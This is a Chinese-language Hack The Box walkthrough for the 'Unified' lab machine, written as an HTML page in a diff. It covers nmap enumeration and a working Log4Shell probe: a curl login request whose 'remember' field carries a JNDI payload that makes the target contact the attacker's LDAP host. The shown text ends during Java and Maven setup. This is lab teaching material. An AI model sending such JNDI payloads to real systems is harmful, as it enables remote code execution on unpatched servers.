@@ -1,0 +1,1217 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Tier 2 第 4 台">
+<title>13. Unified</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/13.-unified/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="13. Unified">
+<meta property='og:description' content="Tier 2 第 4 台">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/13.-unified/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-07T15:15:29&#43;08:00'/><meta property='article:modified_time' content='2026-11-07T15:15:29&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/13.-unified/assets/image-20261107132952960.png' />
+<meta name="twitter:title" content="13. Unified">
+<meta name="twitter:description" content="Tier 2 第 4 台"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/13.-unified/assets/image-20261107132952960.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#task-9">Task 9</a></li>
+        <li><a href="#task-10">Task 10</a></li>
+        <li><a href="#task-11">Task 11</a></li>
+        <li><a href="#task-12">Task 12</a></li>
+        <li><a href="#task-13">Task 13</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/13.-unified/">
+                <img src="/p/13.-unified/assets/image-20261107132952960_hu16854654006512448371.png"
+                        srcset="/p/13.-unified/assets/image-20261107132952960_hu16854654006512448371.png 800w, /p/13.-unified/assets/image-20261107132952960_hu5358464826778176511.png 1600w"
+                        width="800" 
+                        height="319" 
+                        loading="lazy"
+                        alt="Featured image of post 13. Unified" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/13.-unified/">13. Unified</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Tier 2 第 4 台
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-07</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="unified">Unified
+</h1><p><img src="/p/13.-unified/assets/image-20261107132952960.png"
+	width="452"
+	height="180"
+	srcset="/p/13.-unified/assets/image-20261107132952960_hu1019206953378957131.png 480w, /p/13.-unified/assets/image-20261107132952960_hu1341213629778300204.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107132952960"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="602px"
+	
+></p>
+<p>About: Unified is a very easy Linux machine that demonstrates the exploitation of the Log4Shell (CVE-2021-44228) vulnerability in the UniFi Network application. Enumeration reveals a vulnerable UniFi instance where a remote execution can be achieved by crafting and injecting a JNDI payload into a POST request. Then a local MongoDB database can be leveraged to reset the administrator password and gain access to the UniFi admin panel. Plaintext SSH credentials can be discovered in the application settings leading to final privilege escalation.</p>
+<p>介绍：Unified 是一台非常简单的 Linux 机器，它演示了如何利用 UniFi Network 应用程序中的 Log4Shell (CVE-2021-44228) 漏洞。枚举结果显示，UniFi 实例存在漏洞，可以通过构造 JNDI 有效负载并将其注入 POST 请求来实现远程执行。然后可以利用本地 MongoDB 数据库重置管理员密码，并访问 UniFi 管理面板。可以在应用程序设置中发现明文 SSH 凭据，从而导致最终权限提升。</p>
+<p>靶机 IP：10.129.96.149</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>Which are the first four open ports?</p>
+<p>最先开放的四个端口是哪四个？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn 10.129.96.149                              
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-07 00:32 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.96.149 <span class="o">(</span>10.129.96.149<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.72s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">6789/tcp open  ibm-db2-admin
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy
+</span></span><span class="line"><span class="cl">8443/tcp open  https-alt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.26 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -p 22,6789,8080,8443 -sV -sC 10.129.96.149
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-07 00:32 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.96.149 <span class="o">(</span>10.129.96.149<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.58s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE         VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">6789/tcp open  ibm-db2-admin?
+</span></span><span class="line"><span class="cl">8080/tcp open  http            Apache Tomcat <span class="o">(</span>language: en<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class="line"><span class="cl">8443/tcp open  ssl/nagios-nsca Nagios NSCA
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>UniFi/organizationName<span class="o">=</span>Ubiquiti Inc./stateOrProvinceName<span class="o">=</span>New York/countryName<span class="o">=</span>US
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:UniFi
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-12-30T21:37:24
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-03T21:37:24
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: UniFi Network
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was /manage/account/login?redirect<span class="o">=</span>%2Fmanage
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 203.79 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：22,6789,8080,8443</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>What is the title of the software that is running running on port 8443?</p>
+<p>运行在 8443 端口上的软件名称是什么？</p>
+</blockquote>
+<p><img src="/p/13.-unified/assets/image-20261107133717385.png"
+	width="850"
+	height="170"
+	srcset="/p/13.-unified/assets/image-20261107133717385_hu4451434868576019526.png 480w, /p/13.-unified/assets/image-20261107133717385_hu5423151970535794549.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107133717385"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="500"
+		data-flex-basis="1200px"
+	
+></p>
+<p><strong>答案：UniFi Network</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What is the version of the software that is running?</p>
+<p>当前运行的软件版本是什么？</p>
+</blockquote>
+<p><img src="/p/13.-unified/assets/image-20261107133836501.png"
+	width="319"
+	height="191"
+	srcset="/p/13.-unified/assets/image-20261107133836501_hu5106827479099083120.png 480w, /p/13.-unified/assets/image-20261107133836501_hu11587471692478601390.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107133836501"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="400px"
+	
+></p>
+<p><strong>答案：6.4.54</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>What is the CVE for the identified vulnerability?</p>
+<p>已识别漏洞的 CVE 编号是多少？</p>
+</blockquote>
+<p>谷歌搜索 Unifi Network 6.4.54，可知漏洞编号 CVE-2021-44228(Log4Shell)。</p>
+<p>该漏洞是 Apache Log4j2 远程代码执行（RCE）。</p>
+<p>原理是：Log4j2 的 Lookup 解析功能支持 <code>${jndi:ldap://xxx}</code> 表达式；当外部可控输入被日志打印时，会触发 JNDI 去连接攻击者可控的 LDAP 服务，加载恶意字节码并执行任意代码。</p>
+<p><strong>答案：CVE-2021-44228</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>What protocol does JNDI leverage in the injection?</p>
+<p>JNDI 在注入过程中使用什么协议？</p>
+</blockquote>
+<p>一般使用 LDAP 协议。这时一个轻量目录访问协议，默认端口为 389/TCP。</p>
+<p><strong>答案：LDAP</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What tool do we use to intercept the traffic, indicating the attack was successful?</p>
+<p>我们使用什么工具来拦截流量，从而判断攻击是否成功？</p>
+</blockquote>
+<p><img src="/p/13.-unified/assets/image-20261107135535901.png"
+	width="644"
+	height="320"
+	srcset="/p/13.-unified/assets/image-20261107135535901_hu11670963982238390500.png 480w, /p/13.-unified/assets/image-20261107135535901_hu5262407517936767736.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107135535901"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<p>发起登录请求时，请求体中这几个字段我们都可控，尝试控制哪几个可以触发 log4shell。</p>
+<p>先开启 <code>tcpdump</code> 监听流量：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# tcpdump -i tun0 port <span class="m">389</span> 
+</span></span><span class="line"><span class="cl">tcpdump: verbose output suppressed, use -v<span class="o">[</span>v<span class="o">]</span>... <span class="k">for</span> full protocol decode
+</span></span><span class="line"><span class="cl">listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length <span class="m">262144</span> bytes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里只监听 tun0 网卡传来的 389 端口的流量。</p>
+<p>然后修改请求体中的内容，看是否可以触发 LDAP 协议：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -k -X POST -H <span class="s2">&#34;Content-Type: application/json&#34;</span> -d <span class="s1">&#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;123456&#34;,&#34;remember&#34;:false,&#34;strict&#34;:true}&#39;</span> https://10.129.96.149:8443/api/login
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;rc&#34;</span>:<span class="s2">&#34;error&#34;</span>,<span class="s2">&#34;msg&#34;</span>:<span class="s2">&#34;api.err.Invalid&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[]}</span>                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -k -X POST -H <span class="s2">&#34;Content-Type: application/json&#34;</span> -d <span class="s1">&#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;123456&#34;,&#34;remember&#34;:&#34;${jndi:ldap://10.10.16.102/whatever}&#34;,&#34;strict&#34;:true}&#39;</span> https://10.129.96.149:8443/api/login
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;rc&#34;</span>:<span class="s2">&#34;error&#34;</span>,<span class="s2">&#34;msg&#34;</span>:<span class="s2">&#34;api.err.InvalidPayload&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[]}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功触发，可见漏洞存在于 remember 字段：</p>
+<p><img src="/p/13.-unified/assets/image-20261107140833360.png"
+	width="1230"
+	height="270"
+	srcset="/p/13.-unified/assets/image-20261107140833360_hu12196979675843303827.png 480w, /p/13.-unified/assets/image-20261107140833360_hu17637804114760805239.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107140833360"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="455"
+		data-flex-basis="1093px"
+	
+></p>
+<p><strong>答案：tcpdump</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What port do we need to inspect intercepted traffic for?</p>
+<p>我们需要检查截获的流量来自哪个端口？</p>
+</blockquote>
+<p><strong>答案：389</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located in the michiael user&rsquo;s home directory.</p>
+<p>提交位于 michiael 用户主目录中的 flag。</p>
+</blockquote>
+<p>利用 log4shell 获取 web 用户 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# sudo apt install -y openjdk-11-jdk maven --fix-missing
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>切换 Java 版本、查看 Maven 版本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# update-alternatives --config java                     
+</span></span><span class="line"><span class="cl">There are <span class="m">2</span> choices <span class="k">for</span> the alternative java <span class="o">(</span>providing /usr/bin/java<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Selection    Path                                         Priority   Status
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">* <span class="m">0</span>            /usr/lib/jvm/java-25-openjdk-amd64/bin/java   <span class="m">2511</span>      auto mode
+</span></span><span class="line"><span class="cl">  <span class="m">1</span>            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   <span class="m">1111</span>      manual mode
+</span></span><span class="line"><span class="cl">  <span class="m">2</span>            /usr/lib/jvm/java-25-openjdk-amd64/bin/java   <span class="m">2511</span>      manual mode
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Press &lt;enter&gt; to keep the current choice<span class="o">[</span>*<span class="o">]</span>, or <span class="nb">type</span> selection number: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">update-alternatives: using /usr/lib/jvm/java-11-openjdk-amd64/bin/java to provide /usr/bin/java <span class="o">(</span>java<span class="o">)</span> in manual mode
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mvn -version
